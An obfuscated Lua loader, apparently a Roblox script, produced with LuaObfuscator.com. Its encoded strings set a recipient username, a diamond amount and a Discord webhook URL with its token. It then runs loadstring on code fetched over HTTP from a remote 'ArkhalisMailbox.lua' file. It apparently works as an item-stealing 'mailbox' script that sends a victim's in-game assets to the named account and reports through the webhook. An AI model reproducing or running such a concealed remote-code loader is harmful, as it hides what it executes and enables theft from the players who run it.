--[[

 .____                  ________ ___.    _____                           __                

 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 

 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \

 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/

 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   

         \/          \/         \/    \/                \/     \/     \/                   

          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v69=0;while true do if (v69==0) then v19=v0(v3(v30,1,1));return "";end end else local v70=0;local v71;while true do if (v70==0) then v71=v2(v0(v30,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v71,v19);v19=nil;v98=1;end end else return v71;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v72=0;local v73;while true do if (v72==(0 -0)) then v73=(v31/(2^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -(555 + (91 -27))))) ;return v73-(v73%((838 + 94) -(857 + 74))) ;end end else local v74=568 -(367 + (1266 -(68 + 997))) ;local v75;while true do if (v74==(927 -(214 + 713))) then v75=((1271 -(226 + 1044)) + 1)^(v32-((4 -3) + 0)) ;return (((v31%(v75 + v75))>=v75) and ((995 -(32 + 85)) -(282 + 595))) or (1637 -(1523 + 114)) ;end end end end local function v21()local v34=0 + 0 ;local v35;while true do if (v34==(1 + (0 -0))) then return v35;end if (v34==0) then v35=v1(v16,v18,v18);v18=v18 + (958 -(892 + 65)) ;v34=2 -1 ;end end end local function v22()local v36=0 -0 ;local v37;local v38;while true do if (v36==(351 -(87 + (1215 -(802 + 150))))) then return (v38 * ((1173 -737) -(67 + 113))) + v37 ;end if (v36==((0 -0) + 0 + 0)) then v37,v38=v1(v16,v18,v18 + (4 -2) );v18=v18 + 2 + 0 ;v36=3 -2 ;end end end local function v23()local v39,v40,v41,v42=v1(v16,v18,v18 + (1000 -(915 + 82)) );v18=v18 + (11 -7) ;return (v42 * 16777216) + (v41 * (38178 + 27358)) + (v40 * ((1523 -(1069 + 118)) -(181 -101))) + v39 ;end local function v24()local v43=v23();local v44=v23();local v45=1;local v46=(v20(v44,773 -(201 + 571) ,20) * ((3 -1)^(6 + (1164 -(116 + 1022))))) + v43 ;local v47=v20(v44,37 -16 ,31 + (0 -0) );local v48=((v20(v44,823 -(368 + 423) )==1) and  -(3 -2)) or (19 -(10 + 8)) ;if (v47==0) then if (v46==(0 -0)) then return v48 * (442 -(416 + 26)) ;else v47=3 -2 ;v45=0 + 0 + 0 ;end elseif (v47==(3621 -1574)) then return ((v46==((1598 -1160) -(145 + 293))) and (v48 * ((431 -(44 + 386))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(2509 -(998 + 488)) ) * (v45 + (v46/(((860 -(814 + 45)) + 1)^((105 -62) + 9)))) ;end local function v25(v49)local v50=0 + 0 ;local v51;local v52;while true do if ((1 + 1)==v50) then v52={};for v79=1, #v51 do v52[v79]=v2(v1(v3(v51,v79,v79)));end v50=888 -(261 + 624) ;end if (v50==(4 -1)) then return v6(v52);end if (v50==(1080 -(1020 + (206 -146)))) then v51=nil;if  not v49 then v49=v23();if (v49==((3170 -(760 + 987)) -(630 + 793))) then return "";end end v50=1;end if (v50==(3 -2)) then v51=v3(v16,v18,(v18 + v49) -(4 -3) );v18=v18 + v49 ;v50=(1914 -(1789 + 124)) + 1 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=386 -(157 + 229) ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v53~=(2 -0)) then else v58=nil;v59=nil;v53=3;end if (v53~=4) then else while true do if (v54==(2 + 1)) then v61=nil;while true do local v100=0;while true do if (v100~=1) then else if (v55~=(0 -0)) then else local v107=1251 -(721 + 530) ;while true do if (v107==(1272 -(945 + 326))) then v58={};v55=2 -1 ;break;end if (v107==(0 + 0)) then local v131=0;while true do if (v131==1) then v107=701 -(271 + 429) ;break;end if (v131==(0 + 0)) then v56={};v57={};v131=1501 -(1408 + 92) ;end end end end end if (v55~=(1089 -(461 + 625))) then else for v111=1289 -(993 + 295) ,v23() do v57[v111-1 ]=v28();end return v59;end break;end if (v100==0) then if (v55~=2) then else local v108=0 + 0 ;local v109;while true do if ((1171 -(418 + 753))~=v108) then else v109=0;while true do if (v109~=1) then else for v180=1,v23() do local v181=0 + 0 ;local v182;local v183;while true do if (v181==(0 + 0)) then local v187=0;while true do if (v187==(0 + 0)) then v182=0 + 0 ;v183=nil;v187=530 -(406 + 123) ;end if ((1770 -(1749 + 20))==v187) then v181=1 + 0 ;break;end end end if (v181~=1) then else while true do if (v182==(1322 -(1249 + 73))) then v183=v21();if (v20(v183,1 + 0 ,1)==0) then local v195=0;local v196;local v197;local v198;local v199;while true do if (v195~=(1145 -(466 + 679))) then else v196=0;v197=nil;v195=1;end if (v195==1) then v198=nil;v199=nil;v195=2;end if (v195==(4 -2)) then while true do if ((0 -0)==v196) then local v202=1900 -(106 + 1794) ;while true do if (v202==0) then local v215=0;while true do if (v215==1) then v202=1;break;end if ((0 + 0)==v215) then v197=v20(v183,2,3);v198=v20(v183,4,6);v215=1 + 0 ;end end end if (v202~=1) then else v196=2 -1 ;break;end end end if ((2 -1)==v196) then local v203=0;local v204;while true do if (0==v203) then v204=0;while true do if (v204==0) then local v216=0;while true do if (v216==0) then v199={v22(),v22(),nil,nil};if (v197==0) then local v220=0 + 0 ;local v221;local v222;while true do if ((0 -0)==v220) then v221=0 -0 ;v222=nil;v220=167 -(122 + 44) ;end if ((1 -0)==v220) then while true do if (v221==0) then v222=0;while true do if (v222==0) then v199[3]=v22();v199[12 -8 ]=v22();break;end end break;end end break;end end elseif (v197==(1 + 0)) then v199[3]=v23();elseif (v197==(1 + 1)) then v199[5 -2 ]=v23() -(2^(81 -(30 + 35))) ;elseif (v197~=(3 + 0)) then else local v230=0;local v231;local v232;while true do if (0==v230) then v231=1257 -(1043 + 214) ;v232=nil;v230=3 -2 ;end if (v230~=1) then else while true do if (v231==0) then v232=0;while true do if (v232==0) then v199[3]=v23() -((1214 -(323 + 889))^(42 -26)) ;v199[4]=v22();break;end end break;end end break;end end end v216=581 -(361 + 219) ;end if ((321 -(53 + 267))~=v216) then else v204=1 + 0 ;break;end end end if (v204==1) then v196=415 -(15 + 398) ;break;end end break;end end end if (v196~=3) then else if (v20(v198,3,3)==1) then v199[986 -(18 + 964) ]=v61[v199[14 -10 ]];end v56[v180]=v199;break;end if (v196~=(2 + 0)) then else local v206=0;local v207;while true do if (v206==0) then v207=0 + 0 ;while true do if (v207~=(851 -(20 + 830))) then else v196=3;break;end if (v207==(0 + 0)) then local v217=126 -(116 + 10) ;while true do if (v217~=1) then else v207=1;break;end if (v217~=(0 + 0)) then else if (v20(v198,1,739 -(542 + 196) )==(1 -0)) then v199[2]=v61[v199[1 + 1 ]];end if (v20(v198,2 + 0 ,2)==(1 + 0)) then v199[7 -4 ]=v61[v199[3]];end v217=1;end end end end break;end end end end break;end end end break;end end break;end end end v55=3;break;end if (v109==0) then local v174=0;while true do if (v174==(0 -0)) then for v188=1552 -(1126 + 425) ,v60 do local v189=0;local v190;local v191;local v192;local v193;local v194;while true do if (v189==2) then v194=nil;while true do if (v190==(406 -(118 + 287))) then v193=nil;v194=nil;v190=7 -5 ;end if (v190~=2) then else while true do if (v191==(1122 -(118 + 1003))) then v194=nil;while true do if (v192==1) then if (v193==1) then v194=v21()~=0 ;elseif (v193==(5 -3)) then v194=v24();elseif (v193==(380 -(142 + 235))) then v194=v25();end v61[v188]=v194;break;end if (v192==0) then local v209=0;local v210;local v211;while true do if (v209==0) then v210=0 -0 ;v211=nil;v209=1 + 0 ;end if ((978 -(553 + 424))==v209) then while true do if (v210~=(0 -0)) then else v211=0 + 0 ;while true do if (v211==(1 + 0)) then v192=1 + 0 ;break;end if (v211~=(0 + 0)) then else local v218=0 + 0 ;local v219;while true do if (0==v218) then v219=0;while true do if (v219~=(0 -0)) then else local v229=0 -0 ;while true do if (v229==(2 -1)) then v219=1;break;end if (v229==(0 + 0)) then v193=v21();v194=nil;v229=4 -3 ;end end end if (v219==1) then v211=754 -(239 + 514) ;break;end end break;end end end end break;end end break;end end end end break;end if (v191==0) then local v201=0;while true do if (v201~=(0 + 0)) then else local v212=0;while true do if (v212~=(1329 -(797 + 532))) then else v192=0;v193=nil;v212=1 + 0 ;end if (v212==(1 + 0)) then v201=1;break;end end end if (v201~=(2 -1)) then else v191=1;break;end end end end break;end if (v190~=(1202 -(373 + 829))) then else local v200=731 -(476 + 255) ;while true do if (0~=v200) then else v191=0;v192=nil;v200=1131 -(369 + 761) ;end if (v200~=(1 + 0)) then else v190=1 -0 ;break;end end end end break;end if (v189~=0) then else v190=0 -0 ;v191=nil;v189=1;end if ((239 -(64 + 174))~=v189) then else v192=nil;v193=nil;v189=2;end end end v59[3]=v21();v174=1 + 0 ;end if (v174~=(1 -0)) then else v109=337 -(144 + 192) ;break;end end end end break;end end end if (v55==(217 -(42 + 174))) then local v110=0 + 0 ;while true do if (v110==0) then v59={v56,v57,nil,v58};v60=v23();v110=1;end if (v110==(1505 -(363 + 1141))) then v61={};v55=1582 -(1183 + 397) ;break;end end end v100=2 -1 ;end end end break;end if (1==v54) then v57=nil;v58=nil;v54=2;end if (v54~=(2 + 0)) then else v59=nil;v60=nil;v54=3 + 0 ;end if ((1975 -(1913 + 62))~=v54) then else local v97=0 + 0 ;while true do if ((2 -1)==v97) then v54=1934 -(565 + 1368) ;break;end if (v97~=(0 -0)) then else v55=0;v56=nil;v97=1;end end end end break;end if (v53~=(1661 -(1477 + 184))) then else v54=0 -0 ;v55=nil;v53=1;end if (v53~=3) then else v60=nil;v61=nil;v53=4 + 0 ;end if (v53==1) then v56=nil;v57=nil;v53=2;end end end local function v29(v62,v63,v64)local v65=0;local v66;local v67;local v68;while true do if (1==v65) then v68=v62[3];return function(...)local v81=v66;local v82=v67;local v83=v68;local v84=v27;local v85=1;local v86= -1;local v87={};local v88={...};local v89=v12("#",...) -1 ;local v90={};local v91={};for v95=0,v89 do if (v95>=v83) then v87[v95-v83 ]=v88[v95 + 1 ];else v91[v95]=v88[v95 + 1 ];end end local v92=(v89-v83) + 1 ;local v93;local v94;while true do local v96=0;while true do if (v96==1) then if (v94<=4) then if (v94<=1) then if (v94>0) then v91[v93[2]]=v93[3];else local v115=0;local v116;local v117;local v118;local v119;while true do if (2==v115) then for v175=v116,v86 do v119=v119 + 1 ;v91[v175]=v117[v119];end break;end if (0==v115) then v116=v93[2];v117,v118=v84(v91[v116](v13(v91,v116 + 1 ,v93[3])));v115=1;end if (v115==1) then v86=(v118 + v116) -1 ;v119=0;v115=2;end end end elseif (v94<=2) then v91[v93[2]]=v64[v93[3]];elseif (v94>3) then local v132=v93[2];v91[v132]=v91[v132](v13(v91,v132 + 1 ,v86));else v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]][v93[3]]=v93[4];end elseif (v94<=6) then if (v94==5) then local v122=0;local v123;local v124;local v125;local v126;local v127;while true do if (v122==5) then v91[v93[2]]=v93[3];v85=v85 + 1 ;v93=v81[v85];v127=v93[2];v124,v125=v84(v91[v127](v13(v91,v127 + 1 ,v93[3])));v122=6;end if (v122==7) then v127=v93[2];v91[v127]=v91[v127](v13(v91,v127 + 1 ,v86));v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]();break;end if (v122==3) then v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v127=v93[2];v122=4;end if (v122==4) then v126=v91[v93[3]];v91[v127 + 1 ]=v126;v91[v127]=v126[v93[4]];v85=v85 + 1 ;v93=v81[v85];v122=5;end if (v122==0) then v123=nil;v124,v125=nil;v126=nil;v127=nil;v91[v93[2]][v93[3]]=v93[4];v122=1;end if (v122==6) then v86=(v125 + v127) -1 ;v123=0;for v178=v127,v86 do local v179=0;while true do if (v179==0) then v123=v123 + 1 ;v91[v178]=v124[v123];break;end end end v85=v85 + 1 ;v93=v81[v85];v122=7;end if (v122==1) then v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v93=v81[v85];v122=2;end if (v122==2) then v91[v93[2]][v93[3]]=v93[4];v85=v85 + 1 ;v93=v81[v85];v91[v93[2]]=v64[v93[3]];v85=v85 + 1 ;v122=3;end end else v91[v93[2]]();end elseif (v94<=7) then local v128=0;local v129;local v130;while true do if (v128==1) then v91[v129 + 1 ]=v130;v91[v129]=v130[v93[4]];break;end if (v128==0) then v129=v93[2];v130=v91[v93[3]];v128=1;end end elseif (v94==8) then do return;end else v91[v93[2]][v93[3]]=v93[4];end v85=v85 + 1 ;break;end if (v96==0) then v93=v81[v85];v94=v93[1];v96=1;end end end end;end if (v65==0) then v66=v62[1];v67=v62[2];v65=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!113O0003023O005F4703083O00557365726E616D65030C3O00736D65727067616D696E673203083O004469616D6F6E6473024O0080841E4103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O313038352O363235383431383437313032332F6D4F50317361757755507049637175636D506E6C494B324A6D44522D53466B6D4A76524E53546D774D6636476E4C676277544B50345862485F49566C486A69467162684D2O033O004B6579034O00030F3O00576562682O6F6B4475616C482O6F6B030D3O004C6F6164696E675363722O656E026O00F03F030A3O005363726970744E616D65030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756100163O0012033O00013O00304O0002000300124O00013O00304O0004000500124O00013O00304O0006000700124O00013O00304O0008000900124O00013O00304O000A00090012023O00013O0030053O000B000C00124O00013O00304O000D000900124O000E3O00122O0001000F3O00202O00010001001000122O000300116O000100039O0000026O000100012O00083O00017O00",v9(),...);end
